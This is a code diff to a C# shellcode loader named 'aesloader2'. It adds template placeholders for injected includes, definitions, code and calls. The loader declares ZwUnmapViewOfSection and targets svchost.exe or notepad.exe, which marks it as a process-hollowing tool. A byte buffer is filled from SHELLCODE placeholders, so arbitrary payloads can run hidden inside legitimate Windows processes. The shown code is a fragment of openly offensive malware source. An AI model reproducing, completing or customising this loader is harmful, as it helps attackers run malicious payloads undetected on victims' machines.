@@ -6,8 +6,16 @@ using System.Security.Cryptography;
 using System.IO;
 using System.Diagnostics;
 
+//####INCLUDE####
+
+//####DEFINE####
+
 namespace aesloader2
 {
+
+    //####CODE####
+
+
     public sealed class Loader
     {
         public static string strTargetProcess = "C:\\Windows\\System32\\svchost.exe";
@@ -29,9 +37,6 @@ namespace aesloader2
         private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);
 
         
-
-        
-
         IntPtr section_;
         IntPtr localmap_;
         IntPtr pModBase_;
@@ -353,6 +358,8 @@ namespace aesloader2
 
             bool is64bit = true;
             byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
+            
+            //####CALL####
 
             if (is64bit)
                 strTargetProcess = "C:\\Windows\\System32\\notepad.exe";
